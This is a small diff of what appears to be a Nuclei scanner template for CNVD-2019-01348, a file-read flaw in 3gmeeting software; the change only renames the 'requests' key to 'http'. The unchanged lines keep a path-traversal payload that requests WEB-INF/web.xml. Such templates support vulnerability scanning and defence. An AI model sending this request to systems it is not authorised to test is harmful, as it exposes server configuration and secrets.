@@ -8,7 +8,7 @@ info:
   reference: https://www.cnvd.org.cn/flaw/show/CNVD-2019-01348
   tags: 3gmeeting,file_read
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/%c0%ae/WEB-INF/web.xml"
